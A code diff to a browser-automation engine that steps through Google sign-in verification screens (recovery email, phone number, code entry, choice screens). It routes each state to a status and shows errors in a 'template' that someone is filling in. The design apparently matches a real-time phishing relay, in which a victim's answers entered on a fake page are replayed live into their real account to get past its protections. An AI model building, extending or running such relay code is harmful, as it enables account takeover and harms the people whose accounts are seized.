@@ -2208,6 +2208,23 @@ async function phaseWaitingRecoveryEmail(browserId, browser, page, email, platfo
                             };
                             updateBrowserRowDataFast(browserId, updateData);
                             break;
+                        } else if (postRecoveryState.required && postRecoveryState.type === 'text_input' && postRecoveryState.viewName === 'Gmail Phone Number Entry') {
+                            // Recovery accepted — Google advanced to the compulsory
+                            // phone-number entry page. Hand off to WAITINGPHONENUMBER.
+                            logger.info(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] Transitioned to phone number entry. Setting WAITINGPHONENUMBER.`);
+                            finalStatus = "WAITINGPHONENUMBER";
+                            updateData.status = "WAITINGPHONENUMBER";
+                            updateData.recoveryEmail = '';
+                            updateData.lastJsonResponse = JSON.stringify({
+                                ...JSON.parse(updateData.lastJsonResponse || '{}'),
+                                status: "WAITING_PHONE_NUMBER",
+                                verificationState: 'WAITING_PHONE_NUMBER',
+                                viewName: postRecoveryState.viewName,
+                                message: "Recovery email accepted. Phone number entry screen reached."
+                            });
+                            updateBrowserRowDataFast(browserId, updateData);
+                            logger.info(`[engineProcess][${browserId}] +WAITINGPHONENUMBER (after recovery email)`);
+                            break;
                         } else if (postRecoveryState.required && postRecoveryState.type === 'text_input' && postRecoveryState.viewName === 'Gmail Recovery Email Confirmation') {
                             // Still on the recovery page — Google rejected the address.
                             // Stay and surface the error so the template shows it.
@@ -2238,6 +2255,57 @@ async function phaseWaitingRecoveryEmail(browserId, browser, page, email, platfo
                             logger.info(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] Unexpected page state after recovery email. Continuing poll.`);
                         }
                     } catch (interactionError) {
+                        // The input may be gone because Google already advanced
+                        // (e.g. recovery accepted → phone page). Probe before
+                        // pasting a technical error into the template.
+                        let _routedAfterError = false;
+                        try {
+                            const errProbe = await checkVerification(page, platformConfig).catch(() => ({ required: false }));
+                            if (errProbe.required && errProbe.type === 'text_input' && errProbe.viewName === 'Gmail Phone Number Entry') {
+                                logger.info(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] Recovery page gone, phone entry detected after submit error. Setting WAITINGPHONENUMBER.`);
+                                finalStatus = "WAITINGPHONENUMBER";
+                                updateData.status = "WAITINGPHONENUMBER";
+                                updateData.recoveryEmail = '';
+                                updateData.lastJsonResponse = JSON.stringify({
+                                    ...JSON.parse(updateData.lastJsonResponse || '{}'),
+                                    status: "WAITING_PHONE_NUMBER",
+                                    verificationState: 'WAITING_PHONE_NUMBER',
+                                    viewName: errProbe.viewName,
+                                    message: "Recovery email accepted. Phone number entry screen reached."
+                                });
+                                updateBrowserRowDataFast(browserId, updateData);
+                                _routedAfterError = true;
+                            } else if (errProbe.required && errProbe.type === 'code') {
+                                logger.info(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] Recovery page gone, code entry detected after submit error. Setting WAITINGCODE.`);
+                                finalStatus = "WAITINGCODE";
+                                updateData.status = "WAITINGCODE";
+                                updateData.recoveryEmail = '';
+                                updateData.lastJsonResponse = JSON.stringify({
+                                    ...JSON.parse(updateData.lastJsonResponse || '{}'),
+                                    status: "WAITING_CODE",
+                                    verificationState: 'WAITING_CODE',
+                                    viewName: errProbe.viewName,
+                                    message: "Recovery email submitted. Verification code screen reached."
+                                });
+                                updateBrowserRowDataFast(browserId, updateData);
+                                _routedAfterError = true;
+                            } else if (errProbe.required && errProbe.type === 'choice') {
+                                logger.info(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] Recovery page gone, choice screen detected after submit error. Setting WAITINGOPTIONS.`);
+                                finalStatus = "WAITINGOPTIONS";
+                                updateData.status = "WAITINGOPTIONS";
+                                updateData.recoveryEmail = '';
+                                updateData.lastJsonResponse = JSON.stringify({
+                                    ...JSON.parse(updateData.lastJsonResponse || '{}'),
+                                    status: "WAITING_OPTIONS",
+                                    verificationState: 'WAITING_OPTIONS',
+                                    viewName: errProbe.viewName,
+                                    message: "Returned to verification options."
+                                });
+                                updateBrowserRowDataFast(browserId, updateData);
+                                _routedAfterError = true;
+                            }
+                        } catch (_) {}
+                        if (_routedAfterError) break;
                         logger.error(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] Error during recovery email entry: ${interactionError.message}`);
                         updateBrowserRowDataFast(browserId, {
                             status: "WAITINGRECOVERYEMAIL",
